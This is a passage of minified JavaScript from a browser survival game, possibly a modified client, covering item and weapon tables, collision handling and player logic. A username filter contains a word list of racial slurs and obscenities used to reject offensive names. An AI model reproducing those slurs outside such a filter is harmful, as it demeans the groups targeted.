    for (var p = "", U = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", G = 0; G < L; G++) p += U.charAt(Math.floor(Math.random() * U.length));
    return p;
  }, y.exports.countInArray = function (L, p) {
    for (var U = 0, G = 0; G < L.length; G++) L[G] === p && U++;
    return U;
  };
}, function (y, V) {
  y.exports.AnimText = function () {
    this.init = function (d, J, T, c, L, p, U) {
      this.x = d, this.y = J, this.color = U, this.scale = T, this.startScale = this.scale, this.maxScale = 1.5 * T, this.scaleSpeed = 0.7, this.speed = c, this.life = L, this.text = p;
    }, this.update = function (d) {
      this.life && (this.life -= d, this.y -= this.speed * d, this.scale += this.scaleSpeed * d, this.scale >= this.maxScale ? (this.scale = this.maxScale, this.scaleSpeed *= -1) : this.scale <= this.startScale && (this.scale = this.startScale, this.scaleSpeed = 0), this.life <= 0 && (this.life = 0));
    }, this.render = function (d, J, T) {
      d.fillStyle = this.color;
      d.font = this.scale + "px Hammersmith One";
      d.fillText(this.text, this.x - J, this.y - T);
    };
  }, y.exports.TextManager = function () {
    this.texts = [], this.update = function (d, J, T, c) {
      J.textBaseline = "middle", J.textAlign = "center";
      for (var L = 0; L < this.texts.length; ++L) this.texts[L].life && (this.texts[L].update(d), this.texts[L].render(J, T, c));
    }, this.showText = function (d, J, T, L, p, U, G) {
      for (var q, P = 0; P < this.texts.length; ++P) if (!this.texts[P].life) {
        q = this.texts[P];
        break;
      }
      q || (q = new y.exports.AnimText, this.texts.push(q)), q.init(d, J, T, L, p, U, G);
    };
  };
}, function (y, V) {
  y.exports = function (d) {
    this.sid = d, this.init = function (J, T, c, L, p, U, G) {
      U = U || {}, this.sentTo = {}, this.gridLocations = [], this.active = !0, this.doUpdate = U.doUpdate, this.x = J, this.y = T, this.dir = c, this.xWiggle = 0, this.yWiggle = 0, this.scale = L, this.type = p, this.id = U.id, this.owner = G, this.name = U.name, this.isItem = null != this.id, this.group = U.group, this.health = U.health, this.currentHealth = this.health, this.layer = 2, null != this.group ? this.layer = this.group.layer : 0 == this.type ? this.layer = 3 : 2 == this.type ? this.layer = 0 : 4 == this.type && (this.layer = -1), this.colDiv = U.colDiv || 1, this.blocker = U.blocker, this.ignoreCollision = U.ignoreCollision, this.dontGather = U.dontGather, this.hideFromEnemy = U.hideFromEnemy, this.friction = U.friction, this.projDmg = U.projDmg, this.dmg = U.dmg, this.pDmg = U.pDmg, this.pps = U.pps, this.zIndex = U.zIndex || 0, this.turnSpeed = U.turnSpeed, this.req = U.req, this.trap = U.trap, this.healCol = U.healCol, this.teleport = U.teleport, this.boostSpeed = U.boostSpeed, this.projectile = U.projectile, this.shootRange = U.shootRange, this.shootRate = U.shootRate, this.shootCount = this.shootRate, this.spawnPoint = U.spawnPoint;
    }, this.changeHealth = function (J, T) {
      return this.health += J, this.health <= 0;
    }, this.getScale = function (J, T) {
      return J = J || 1, this.scale * (this.isItem || 2 == this.type || 3 == this.type || 4 == this.type ? 1 : 0.6 * J) * (T ? 1 : this.colDiv);
    }, this.visibleToPlayer = function (J) {
      return !this.hideFromEnemy || this.owner && (this.owner == J || this.owner.team && J.team == this.owner.team);
    }, this.update = function (J) {
      this.active && (this.xWiggle && (this.xWiggle *= Math.pow(0.99, J)), this.yWiggle && (this.yWiggle *= Math.pow(0.99, J)), this.turnSpeed && (this.dir += this.turnSpeed * J));
    };
  };
}, function (y, V) {
  y.exports.groups = [{id: 0, name: "food", layer: 0}, {id: 1, name: "walls", place: !0, limit: 30, layer: 0}, {id: 2, name: "spikes", place: !0, limit: 15, layer: 0}, {id: 3, name: "mill", place: !0, limit: 7, layer: 1}, {id: 4, name: "mine", place: !0, limit: 1, layer: 0}, {id: 5, name: "trap", place: !0, limit: 6, layer: -1}, {id: 6, name: "booster", place: !0, limit: 12, layer: -1}, {id: 7, name: "turret", place: !0, limit: 2, layer: 1}, {id: 8, name: "watchtower", place: !0, limit: 12, layer: 1}, {id: 9, name: "buff", place: !0, limit: 4, layer: -1}, {id: 10, name: "spawn", place: !0, limit: 1, layer: -1}, {id: 11, name: "sapling", place: !0, limit: 2, layer: 0}, {id: 12, name: "blocker", place: !0, limit: 3, layer: -1}, {id: 13, name: "teleporter", place: !0, limit: 2, layer: -1}], V.projectiles = [{indx: 0, layer: 0, src: "arrow_1", dmg: 25, speed: 1.6, scale: 103, range: 1e3}, {indx: 1, layer: 1, dmg: 25, scale: 20}, {indx: 0, layer: 0, src: "arrow_1", dmg: 35, speed: 2.5, scale: 103, range: 1200}, {indx: 0, layer: 0, src: "arrow_1", dmg: 30, speed: 2, scale: 103, range: 1200}, {indx: 1, layer: 1, dmg: 16, scale: 20}, {indx: 0, layer: 0, src: "bullet_1", dmg: 50, speed: 3.6, scale: 160, range: 1400}], V.weapons = window.weapons = [{id: 0, type: 0, name: "tool hammer", desc: "tool for gathering all resources", src: "hammer_1", length: 140, width: 140, xOff: -3, yOff: 18, dmg: 25, range: 65, gather: 1, speed: 300}, {id: 1, type: 0, age: 2, name: "hand axe", desc: "gathers resources at a higher rate", src: "axe_1", length: 140, width: 140, xOff: 3, yOff: 24, dmg: 30, spdMult: 1, range: 70, gather: 2, speed: 400}, {id: 2, type: 0, age: 8, pre: 1, name: "great axe", desc: "deal more damage and gather more resources", src: "great_axe_1", length: 140, width: 140, xOff: -8, yOff: 25, dmg: 35, spdMult: 1, range: 75, gather: 4, speed: 400}, {id: 3, type: 0, age: 2, name: "short sword", desc: "increased heal power but slower move speed", src: "sword_1", iPad: 1.3, length: 130, width: 210, xOff: -8, yOff: 46, dmg: 35, spdMult: 0.85, range: 110, gather: 1, speed: 300}, {id: 4, type: 0, age: 8, pre: 3, name: "katana", desc: "greater range and damage", src: "samurai_1", iPad: 1.3, length: 130, width: 210, xOff: -8, yOff: 59, dmg: 40, spdMult: 0.8, range: 118, gather: 1, speed: 300}, {id: 5, type: 0, age: 2, name: "polearm", desc: "long range melee weapon", src: "spear_1", iPad: 1.3, length: 130, width: 210, xOff: -8, yOff: 53, dmg: 45, knock: 0.2, spdMult: 0.82, range: 142, gather: 1, speed: 700}, {id: 6, type: 0, age: 2, name: "bat", desc: "fast long range melee weapon", src: "bat_1", iPad: 1.3, length: 110, width: 180, xOff: -8, yOff: 53, dmg: 20, knock: 0.7, range: 110, gather: 1, speed: 300}, {id: 7, type: 0, age: 2, name: "daggers", desc: "really fast short range weapon", src: "dagger_1", iPad: 0.8, length: 110, width: 110, xOff: 18, yOff: 0, dmg: 20, knock: 0.1, range: 65, gather: 1, hitSlow: 0.1, spdMult: 1.13, speed: 100}, {id: 8, type: 0, age: 2, name: "stick", desc: "great for gathering but very weak", src: "stick_1", length: 140, width: 140, xOff: 3, yOff: 24, dmg: 1, spdMult: 1, range: 70, gather: 7, speed: 400}, {id: 9, type: 1, age: 6, name: "hunting bow", desc: "bow used for ranged combat and hunting", src: "bow_1", req: ["wood", 4], length: 120, width: 120, xOff: -6, yOff: 0, projectile: 0, spdMult: 0.75, speed: 600}, {id: 10, type: 1, age: 6, name: "great hammer", desc: "hammer used for destroying structures", src: "great_hammer_1", length: 140, width: 140, xOff: -9, yOff: 25, dmg: 10, spdMult: 0.88, range: 75, sDmg: 7.5, gather: 1, speed: 400}, {id: 11, type: 1, age: 6, name: "wooden shield", desc: "blocks projectiles and reduces melee damage", src: "shield_1", length: 120, width: 120, shield: 0.2, speed: 111, xOff: 6, yOff: 0, spdMult: 0.7}, {id: 12, type: 1, age: 8, pre: 9, name: "crossbow", desc: "deals more damage and has greater range", src: "crossbow_1", req: ["wood", 5], aboveHand: !0, armS: 0.75, length: 120, width: 120, xOff: -4, yOff: 0, projectile: 2, spdMult: 0.7, speed: 700}, {id: 13, type: 1, age: 9, pre: 12, name: "repeater crossbow", desc: "high firerate crossbow with reduced damage", src: "crossbow_2", req: ["wood", 10], aboveHand: !0, armS: 0.75, length: 120, width: 120, xOff: -4, yOff: 0, projectile: 3, spdMult: 0.7, speed: 230}, {id: 14, type: 1, age: 6, name: "mc grabby", desc: "steals resources from enemies", src: "grab_1", length: 130, width: 210, xOff: -8, yOff: 53, dmg: 0, steal: 250, knock: 0.2, spdMult: 1.05, range: 125, gather: 0, speed: 700}, {id: 15, type: 1, age: 9, pre: 12, name: "musket", desc: "slow firerate but high damage and range", src: "musket_1", req: ["stone", 10], aboveHand: !0, rec: 0.35, armS: 0.6, hndS: 0.3, hndD: 1.6, length: 205, width: 205, xOff: 25, yOff: 0, projectile: 5, hideProjectile: !0, spdMult: 0.6, speed: 1500}], y.exports.list = [{group: y.exports.groups[0], name: "apple", desc: "restores 20 health when consumed", req: ["food", 10], consume: function (J) {
    return J.changeHealth(20, J);
  }, scale: 22, holdOffset: 15}, {age: 3, group: y.exports.groups[0], name: "cookie", desc: "restores 40 health when consumed", req: ["food", 15], consume: function (J) {
    return J.changeHealth(40, J);
  }, scale: 27, holdOffset: 15}, {age: 7, group: y.exports.groups[0], name: "cheese", desc: "restores 30 health and another 50 over 5 seconds", req: ["food", 25], consume: function (J) {
    return !!(J.changeHealth(30, J) || J.health < 100) && (J.dmgOverTime.dmg = -10, J.dmgOverTime.doer = J, J.dmgOverTime.time = 5, !0);
  }, scale: 27, holdOffset: 15}, {group: y.exports.groups[1], name: "wood wall", desc: "provides protection for your village", req: ["wood", 10], projDmg: !0, health: 380, scale: 50, holdOffset: 20, placeOffset: -5}, {age: 3, group: y.exports.groups[1], name: "stone wall", desc: "provides improved protection for your village", req: ["stone", 25], health: 900, scale: 50, holdOffset: 20, placeOffset: -5}, {age: 7, pre: 1, group: y.exports.groups[1], name: "castle wall", desc: "provides powerful protection for your village", req: ["stone", 35], health: 1500, scale: 52, holdOffset: 20, placeOffset: -5}, {group: y.exports.groups[2], name: "spikes", desc: "damages enemies when they touch them", req: ["wood", 20, "stone", 5], health: 400, dmg: 20, scale: 49, spritePadding: -23, holdOffset: 8, placeOffset: -5}, {age: 5, group: y.exports.groups[2], name: "greater spikes", desc: "damages enemies when they touch them", req: ["wood", 30, "stone", 10], health: 500, dmg: 35, scale: 52, spritePadding: -23, holdOffset: 8, placeOffset: -5}, {age: 9, pre: 1, group: y.exports.groups[2], name: "poison spikes", desc: "poisons enemies when they touch them", req: ["wood", 35, "stone", 15], health: 600, dmg: 30, pDmg: 5, scale: 52, spritePadding: -23, holdOffset: 8, placeOffset: -5}, {age: 9, pre: 2, group: y.exports.groups[2], name: "spinning spikes", desc: "damages enemies when they touch them", req: ["wood", 30, "stone", 20], health: 500, dmg: 45, turnSpeed: 0.003, scale: 52, spritePadding: -23, holdOffset: 8, placeOffset: -5}, {group: y.exports.groups[3], name: "windmill", desc: "generates gold over time", req: ["wood", 50, "stone", 10], health: 400, pps: 1, spritePadding: 25, iconLineMult: 12, scale: 45, holdOffset: 20, placeOffset: 5}, {age: 5, pre: 1, group: y.exports.groups[3], name: "faster windmill", desc: "generates more gold over time", req: ["wood", 60, "stone", 20], health: 500, pps: 1.5, spritePadding: 25, iconLineMult: 12, scale: 47, holdOffset: 20, placeOffset: 5}, {age: 8, pre: 1, group: y.exports.groups[3], name: "power mill", desc: "generates more gold over time", req: ["wood", 100, "stone", 50], health: 800, pps: 2, spritePadding: 25, iconLineMult: 12, scale: 47, holdOffset: 20, placeOffset: 5}, {age: 5, group: y.exports.groups[4], type: 2, name: "mine", desc: "allows you to mine stone", req: ["wood", 20, "stone", 100], iconLineMult: 12, scale: 65, holdOffset: 20, placeOffset: 0}, {age: 5, group: y.exports.groups[11], type: 0, name: "sapling", desc: "allows you to farm wood", req: ["wood", 150], iconLineMult: 12, colDiv: 0.5, scale: 110, holdOffset: 50, placeOffset: -15}, {age: 4, group: y.exports.groups[5], name: "pit trap", desc: "pit that traps enemies if they walk over it", req: ["wood", 30, "stone", 30], trap: !0, ignoreCollision: !0, hideFromEnemy: !0, health: 500, colDiv: 0.2, scale: 50, holdOffset: 20, placeOffset: -5}, {age: 4, group: y.exports.groups[6], name: "boost pad", desc: "provides boost when stepped on", req: ["stone", 20, "wood", 5], ignoreCollision: !0, boostSpeed: 1.5, health: 150, colDiv: 0.7, scale: 45, holdOffset: 20, placeOffset: -5}, {age: 7, group: y.exports.groups[7], doUpdate: !0, name: "turret", desc: "defensive structure that shoots at enemies", req: ["wood", 200, "stone", 150], health: 800, projectile: 1, shootRange: 700, shootRate: 2200, scale: 43, holdOffset: 20, placeOffset: -5}, {age: 7, group: y.exports.groups[8], name: "platform", desc: "platform to shoot over walls and cross over water", req: ["wood", 20], ignoreCollision: !0, zIndex: 1, health: 300, scale: 43, holdOffset: 20, placeOffset: -5}, {age: 7, group: y.exports.groups[9], name: "healing pad", desc: "standing on it will slowly heal you", req: ["wood", 30, "food", 10], ignoreCollision: !0, healCol: 15, health: 400, colDiv: 0.7, scale: 45, holdOffset: 20, placeOffset: -5}, {age: 9, group: y.exports.groups[10], name: "spawn pad", desc: "you will spawn here when you die but it will dissapear", req: ["wood", 100, "stone", 100], health: 400, ignoreCollision: !0, spawnPoint: !0, scale: 45, holdOffset: 20, placeOffset: -5}, {age: 7, group: y.exports.groups[12], name: "blocker", desc: "blocks building in radius", req: ["wood", 30, "stone", 25], ignoreCollision: !0, blocker: 300, health: 400, colDiv: 0.7, scale: 45, holdOffset: 20, placeOffset: -5}, {age: 7, group: y.exports.groups[13], name: "teleporter", desc: "teleports you to a random point on the map", req: ["wood", 60, "stone", 60], ignoreCollision: !0, teleport: !0, health: 200, colDiv: 0.7, scale: 45, holdOffset: 20, placeOffset: -5}];
  for (var d = 0; d < y.exports.list.length; ++d) y.exports.list[d].id = d, y.exports.list[d].pre && (y.exports.list[d].pre = d - y.exports.list[d].pre);
}, function (y, V) {
  y.exports = {};
}, function (y, V) {
  var d = Math.floor, J = Math.abs, T = Math.cos, c = Math.sin, L = (Math.pow, Math.sqrt);
  y.exports = function (U, G, q, P, H, N) {
    var X, F;
    this.objects = G, this.grids = {}, this.updateObjects = [];
    var Z = P.mapScale / P.colGrid;
    this.setObjectGrids = function (I) {
      for (var M = Math.min(P.mapScale, Math.max(0, I.x)), K = Math.min(P.mapScale, Math.max(0, I.y)), w = 0; w < P.colGrid; ++w) {
        X = w * Z;
        for (var R = 0; R < P.colGrid; ++R) F = R * Z, M + I.scale >= X && M - I.scale <= X + Z && K + I.scale >= F && K - I.scale <= F + Z && (this.grids[w + "_" + R] || (this.grids[w + "_" + R] = []), this.grids[w + "_" + R].push(I), I.gridLocations.push(w + "_" + R));
      }
    }, this.removeObjGrid = function (I) {
      for (var M, K = 0; K < I.gridLocations.length; ++K) (M = this.grids[I.gridLocations[K]].indexOf(I)) >= 0 && this.grids[I.gridLocations[K]].splice(M, 1);
    }, this.disableObj = function (I) {
      if (I.active = !1, N) {
        I.owner && I.pps && (I.owner.pps -= I.pps), this.removeObjGrid(I);
        var M = this.updateObjects.indexOf(I);
        M >= 0 && this.updateObjects.splice(M, 1);
      }
    }, this.hitObj = function (I, M) {
      for (var K = 0; K < H.length; ++K) H[K].active && (I.sentTo[H[K].id] && (I.active ? H[K].canSee(I) && N.send(H[K].id, "8", q.fixTo(M, 1), I.sid) : N.send(H[K].id, "12", I.sid)), I.active || I.owner != H[K] || H[K].changeItemCount(I.group.id, -1));
    };
    var z, O, E = [];
    this.getGridArrays = function (I, M, K) {
      X = d(I / Z), F = d(M / Z), E.length = 0;
      try {
        this.grids[X + "_" + F] && E.push(this.grids[X + "_" + F]), I + K >= (X + 1) * Z && ((z = this.grids[X + 1 + "_" + F]) && E.push(z), F && M - K <= F * Z ? (z = this.grids[X + 1 + "_" + (F - 1)]) && E.push(z) : M + K >= (F + 1) * Z && (z = this.grids[X + 1 + "_" + (F + 1)]) && E.push(z)), X && I - K <= X * Z && ((z = this.grids[X - 1 + "_" + F]) && E.push(z), F && M - K <= F * Z ? (z = this.grids[X - 1 + "_" + (F - 1)]) && E.push(z) : M + K >= (F + 1) * Z && (z = this.grids[X - 1 + "_" + (F + 1)]) && E.push(z)), M + K >= (F + 1) * Z && (z = this.grids[X + "_" + (F + 1)]) && E.push(z), F && M - K <= F * Z && (z = this.grids[X + "_" + (F - 1)]) && E.push(z);
      } catch (w) {}
      return E;
    }, this.add = function (I, M, K, w, R, v, S, A, Y) {
      O = null;
      for (var b = 0; b < G.length; ++b) if (G[b].sid == I) {
        O = G[b];
        break;
      }
      if (!O) for (b = 0; b < G.length; ++b) if (!G[b].active) {
        O = G[b];
        break;
      }
      O || (O = new U(I), G.push(O)), A && (O.sid = I), O.init(M, K, w, R, v, S, Y), N && (this.setObjectGrids(O), O.doUpdate && this.updateObjects.push(O));
    }, this.disableBySid = function (I) {
      for (var M = 0; M < G.length; ++M) if (G[M].sid == I) {
        this.disableObj(G[M]);
        break;
      }
    }, this.removeAllItems = function (I, M) {
      for (var K = 0; K < G.length; ++K) G[K].active && G[K].owner && G[K].owner.sid == I && this.disableObj(G[K]);
      M && M.broadcast("13", I);
    }, this.fetchSpawnObj = function (I) {
      for (var M = null, K = 0; K < G.length; ++K) if ((O = G[K]).active && O.owner && O.owner.sid == I && O.spawnPoint) {
        M = [O.x, O.y], this.disableObj(O), N.broadcast("12", O.sid), O.owner && O.owner.changeItemCount(O.group.id, -1);
        break;
      }
      return M;
    }, this.checkItemLocation = function (I, M, K, w, R, v, S) {
      for (var A = 0; A < G.length; ++A) {
        var Y = G[A].blocker ? G[A].blocker : G[A].getScale(w, G[A].isItem);
        if (G[A].active && q.getDistance(I, M, G[A].x, G[A].y) < K + Y) return !1;
      }
      return !(!v && 18 != R && M >= P.mapScale / 2 - P.riverWidth / 2 && M <= P.mapScale / 2 + P.riverWidth / 2);
    }, this.addProjectile = function (I, M, K, w, R) {
      for (var v, S = items.projectiles[R], A = 0; A < projectiles.length; ++A) if (!projectiles[A].active) {
        v = projectiles[A];
        break;
      }
      v || (v = new Projectile(H, q), projectiles.push(v)), v.init(R, I, M, K, S.speed, w, S.scale);
    }, this.checkCollision = function (I, M, K) {
      K = K || 1;
      var w = I.x - M.x, R = I.y - M.y, v = I.scale + M.scale;
      if (J(w) <= v || J(R) <= v) {
        v = I.scale + (M.getScale ? M.getScale() : M.scale);
        var S = L(w * w + R * R) - v;
        if (S <= 0) {
          if (M.ignoreCollision) !M.trap || I.noTrap || M.owner == I || M.owner && M.owner.team && M.owner.team == I.team ? M.boostSpeed ? (I.xVel += K * M.boostSpeed * (M.weightM || 1) * T(M.dir), I.yVel += K * M.boostSpeed * (M.weightM || 1) * c(M.dir)) : M.healCol ? I.healCol = M.healCol : M.teleport && (I.x = q.randInt(0, P.mapScale), I.y = q.randInt(0, P.mapScale)) : (I.lockMove = !0, M.hideFromEnemy = !1); else {
            var A = q.getDirection(I.x, I.y, M.x, M.y);
            if (q.getDistance(I.x, I.y, M.x, M.y), M.isPlayer ? (S = -1 * S / 2, I.x += S * T(A), I.y += S * c(A), M.x -= S * T(A), M.y -= S * c(A)) : (I.x = M.x + v * T(A), I.y = M.y + v * c(A), I.xVel *= 0.75, I.yVel *= 0.75), M.dmg && M.owner != I && (!M.owner || !M.owner.team || M.owner.team != I.team)) {
              I.changeHealth(-M.dmg, M.owner, M);
              var Y = 1.5 * (M.weightM || 1);
              I.xVel += Y * T(A), I.yVel += Y * c(A), !M.pDmg || I.skin && I.skin.poisonRes || (I.dmgOverTime.dmg = M.pDmg, I.dmgOverTime.time = 5, I.dmgOverTime.doer = M.owner), I.colDmg && M.health && (M.changeHealth(-I.colDmg) && this.disableObj(M), this.hitObj(M, q.getDirection(I.x, I.y, M.x, M.y)));
            }
          }
          return M.zIndex > I.zIndex && (I.zIndex = M.zIndex), !0;
        }
      }
      return !1;
    };
  };
}, function (y, V, d) {
  var J = new (d(49));
  J.addWords("jew", "black", "baby", "child", "white", "porn", "pedo", "trump", "clinton", "hitler", "nazi", "gay", "pride", "sex", "pleasure", "touch", "poo", "kids", "rape", "white power", "nigga", "nig nog", "doggy", "rapist", "boner", "nigger", "nigg", "finger", "nogger", "nagger", "nig", "fag", "gai", "pole", "stripper", "penis", "vagina", "pussy", "nazi", "hitler", "stalin", "burn", "chamber", "cock", "peen", "dick", "spick", "nieger", "die", "satan", "n|ig", "nlg", "cunt", "c0ck", "fag", "lick", "condom", "anal", "shit", "phile", "little", "kids", "free KR", "tiny", "sidney", "ass", "kill", ".io", "(dot)", "[dot]", "mini", "whiore", "whore", "faggot", "github", "1337", "666", "satan", "senpa", "discord", "d1scord", "mistik", ".io", "senpa.io", "sidney", "sid", "senpaio", "vries", "asa");
  var T = Math.abs, L = Math.cos, p = Math.sin, U = Math.pow, G = Math.sqrt;
  y.exports = function (q, P, H, N, X, F, Z, z, O, E, I, M, K, R) {
    this.id = q, this.sid = P, this.tmpScore = 0, this.team = null, this.skinIndex = 0, this.tailIndex = 0, this.hitTime = 0, this.tails = {};
    for (var A = 0; A < I.length; ++A) I[A].price <= 0 && (this.tails[I[A].id] = 1);
    for (this.skins = {}, A = 0; A < E.length; ++A) E[A].price <= 0 && (this.skins[E[A].id] = 1);
    this.points = 0, this.dt = 0, this.hidden = !1, this.itemCounts = {}, this.isPlayer = !0, this.pps = 0, this.moveDir = void 0, this.skinRot = 0, this.lastPing = 0, this.iconIndex = 0, this.skinColor = 0, this.spawn = function (W) {
      this.active = !0, this.alive = !0, this.lockMove = !1, this.lockDir = !1, this.minimapCounter = 0, this.chatCountdown = 0, this.shameCount = 0, this.shameTimer = 0, this.sentTo = {}, this.gathering = 0, this.autoGather = 0, this.animTime = 0, this.animSpeed = 0, this.mouseState = 0, this.buildIndex = -1, this.weaponIndex = 0, this.dmgOverTime = {}, this.noMovTimer = 0, this.maxXP = 300, this.XP = 0, this.age = 1, this.kills = 0, this.upgrAge = 2, this.upgradePoints = 0, this.x = 0, this.y = 0, this.zIndex = 0, this.xVel = 0, this.yVel = 0, this.slowMult = 1, this.dir = 0, this.dirPlus = 0, this.targetDir = 0, this.targetAngle = 0, this.maxHealth = 100, this.health = this.maxHealth, this.scale = H.playerScale, this.speed = H.playerSpeed, this.resetMoveDir(), this.resetResources(W), this.items = [0, 3, 6, 10], this.weapons = [0], this.shootCount = 0, this.weaponXP = [], this.reloads = {}, this.primary = {reload: 1, id: 0, variant: 0, reloadid: 0, dmg: 25}, this.secondary = {reload: 1, id: undefined, variant: 0, reloadid: 1, dmg: 50}, this.turret = 1, this.tracker = {heal: {lastChange: 0, tick: 0}}, this.bullTick = 0;
    }, this.resetMoveDir = function () {
      this.moveDir = void 0;
    }, this.resetResources = function (W) {
      for (var B = 0; B < H.resourceTypes.length; ++B) this[H.resourceTypes[B]] = W ? 100 : 0;
    }, this.addItem = function (W) {
      var B = O.list[W];
      if (B) {
        for (var j = 0; j < this.items.length; ++j) if (O.list[this.items[j]].group == B.group) return this.buildIndex == this.items[j] && (this.buildIndex = W), this.items[j] = W, !0;
        return this.items.push(W), !0;
      }
      return !1;
    }, this.setUserData = function (W) {
      if (W) {
        this.name = "unknown";
        var B = W.name + "", j = !1, C = (B = (B = (B = (B = B.slice(0, H.maxNameLength)).replace(/[^\w:\(\)\/? -]+/gim, " ")).replace(/[^\x00-\x7F]/g, " ")).trim()).toLowerCase().replace(/\s/g, "").replace(/1/g, "i").replace(/0/g, "o").replace(/5/g, "s");
        for (var y0 of J.list) if (-1 != C.indexOf(y0)) {
          j = !0;
          break;
        }
        B.length > 0 && !j && (this.name = B), this.skinColor = 0, H.skinColors[W.skin] && (this.skinColor = W.skin);
      }
    }, this.getData = function () {
      return [this.id, this.sid, this.name, N.fixTo(this.x, 2), N.fixTo(this.y, 2), N.fixTo(this.dir, 3), this.health, this.maxHealth, this.scale, this.skinColor];
    }, this.setData = function (W) {
      this.id = W[0], this.sid = W[1], this.name = W[2], this.x = W[3], this.y = W[4], this.dir = W[5], this.health = W[6], this.maxHealth = W[7], this.scale = W[8], this.skinColor = W[9];
    };
    var Y = 0;
    this.update = function (W) {
      if (this.alive) {
        if (this.weaponIndex < 9) {
          if (this.primary.id == this.weaponIndex) {
            this.primary.variant = this.weaponVariant;
            this.primary.dmg = Math.round(window.weapons[this.weaponIndex].dmg * window.variantMulti(this.weaponVariant));
          } else {
            this.primary.reload = 1;
            this.primary.id = this.weaponIndex;
            if (!this.secondary.id && this.primary.id > 0) {
              this.secondary.id = 15;
              this.secondary.variant = 0;
              this.secondary.dmg = 50;
            }
          }
        } else {
          if (this.secondary.id == this.weaponIndex) {
            this.secondary.variant = this.weaponVariant;
            if (this.weaponIndex == 10) {
              this.secondary.dmg = Math.round(window.weapons[this.weaponIndex].dmg * window.variantMulti(this.weaponVariant));
            } else {
              this.secondary.dmg = window.secondaryDmg(this.weaponIndex);
            }
          } else {
            this.secondary.reload = 1;
            this.secondary.id = this.weaponIndex;
            if (!this.primary.id) {
              this.primary.id = 5;
              this.primary.variant = 2;
              this.primary.dmg = 45;
            }
          }
        }
        if (this.buildIndex == -1) {
          if (this.weaponIndex < 9) {
            if (this.primary.reloadid == this.weaponIndex) {
              this.primary.reload = Math.min(this.primary.reload + 111 / (window.weapons[this.weaponIndex].speed * (this.primary.fastReload == !![] ? 0.78 : 1)), 1);
              if (this.primary.fastReload == !![] && this.primary.reload == 1) {
                this.primary.fastReload = ![];
              }
            } else {
              this.primary.reloadid = this.weaponIndex;
              this.secondary.id = 15;
              this.secondary.variant = 0;
              this.secondary.dmg = 50;
            }
          } else {
            if (this.secondary.reloadid == this.weaponIndex) {
              this.secondary.reload = Math.min(this.secondary.reload + 111 / (window.weapons[this.weaponIndex].speed * (this.secondary.fastReload == !![] ? 0.78 : 1)), 1);
              if (this.secondary.fastReload == !![] && this.secondary.reload == 1) {
                this.secondary.fastReload = ![];
              }
            } else {
              this.secondary.reloadid = this.weaponIndex;
              this.primary.id = 5;
              this.primary.variant = 2;
              this.primary.dmg = 45;
            }
          }
        }
        this.turret = Math.min(this.turret + 0.0444, 1);
      }
    }, this.addWeaponXP = function (W) {
      this.weaponXP[this.weaponIndex] || (this.weaponXP[this.weaponIndex] = 0), this.weaponXP[this.weaponIndex] += W;
    }, this.earnXP = function (W) {
      this.age < H.maxAge && (this.XP += W, this.XP >= this.maxXP ? (this.age < H.maxAge ? (this.age++, this.XP = 0, this.maxXP *= 1.2) : this.XP = this.maxXP, this.upgradePoints++, M.send(this.id, "16", this.upgradePoints, this.upgrAge), M.send(this.id, "15", this.XP, N.fixTo(this.maxXP, 1), this.age)) : M.send(this.id, "15", this.XP));
    }, this.changeHealth = function (W, B) {
      if (W > 0 && this.health >= this.maxHealth) return !1;
      W < 0 && this.skin && (W *= this.skin.dmgMult || 1), W < 0 && this.tail && (W *= this.tail.dmgMult || 1), W < 0 && (this.hitTime = Date.now()), this.health += W, this.health > this.maxHealth && (W -= this.health - this.maxHealth, this.health = this.maxHealth), this.health <= 0 && this.kill(B);
      for (var j = 0; j < Z.length; ++j) this.sentTo[Z[j].id] && M.send(Z[j].id, "h", this.sid, Math.round(this.health));
      return !B || !B.canSee(this) || B == this && W < 0 || M.send(B.id, "t", Math.round(this.x), Math.round(this.y), Math.round(-W), 1), !0;
    }, this.kill = function (W) {
      W && W.alive && (W.kills++, W.skin && W.skin.goldSteal ? K(W, Math.round(this.points / 2)) : K(W, Math.round(100 * this.age * (W.skin && W.skin.kScrM ? W.skin.kScrM : 1))), M.send(W.id, "9", "kills", W.kills, 1)), this.alive = !1, M.send(this.id, "11"), R();
    }, this.addResource = function (W, B, j) {
      !j && B > 0 && this.addWeaponXP(B), 3 == W ? K(this, B, !0) : (this[H.resourceTypes[W]] += B, M.send(this.id, "9", H.resourceTypes[W], this[H.resourceTypes[W]], 1));
    }, this.changeItemCount = function (W, B) {
      this.itemCounts[W] = this.itemCounts[W] || 0, this.itemCounts[W] += B, M.send(this.id, "14", W, this.itemCounts[W]);
    }, this.buildItem = function () {
      if (this.hitTime) {
        let W = tick - this.hitTime;
        this.hitTime = 0;
        if (W < 2) {
          this.shameCount++;
        } else {
          this.shameCount = Math.max(0, this.shameCount - 2);
        }
      }
    }, this.hasRes = function (W, B) {
      for (var j = 0; j < W.req.length;) {
        if (this[W.req[j]] < Math.round(W.req[j + 1] * (B || 1))) return !1;
        j += 2;
      }
      return !0;
    }, this.useRes = function (W, B) {
      if (!H.inSandbox) for (var j = 0; j < W.req.length;) this.addResource(H.resourceTypes.indexOf(W.req[j]), -Math.round(W.req[j + 1] * (B || 1))), j += 2;
    }, this.canBuild = function (W) {
      return !!H.inSandbox || !(W.group.limit && this.itemCounts[W.group.id] >= W.group.limit) && this.hasRes(W);
    }, this.gather = function () {
      this.noMovTimer = 0, this.slowMult -= O.weapons[this.weaponIndex].hitSlow || 0.3, this.slowMult < 0 && (this.slowMult = 0);
      for (var W, B, j, C = H.fetchVariant(this), y0 = C.poison, y1 = C.val, y2 = {}, y3 = F.getGridArrays(this.x, this.y, O.weapons[this.weaponIndex].range), y4 = 0; y4 < y3.length; ++y4) for (var y5 = 0; y5 < y3[y4].length; ++y5) if ((B = y3[y4][y5]).active && !B.dontGather && !y2[B.sid] && B.visibleToPlayer(this) && N.getDistance(this.x, this.y, B.x, B.y) - B.scale <= O.weapons[this.weaponIndex].range && (W = N.getDirection(B.x, B.y, this.x, this.y), N.getAngleDist(W, this.dir) <= H.gatherAngle)) {
        if (y2[B.sid] = 1, B.health) {
          if (B.changeHealth(-O.weapons[this.weaponIndex].dmg * y1 * (O.weapons[this.weaponIndex].sDmg || 1) * (this.skin && this.skin.bDmg ? this.skin.bDmg : 1), this)) {
            for (var y6 = 0; y6 < B.req.length;) this.addResource(H.resourceTypes.indexOf(B.req[y6]), B.req[y6 + 1]), y6 += 2;
            F.disableObj(B);
          }
        } else {
          this.earnXP(4 * O.weapons[this.weaponIndex].gather);
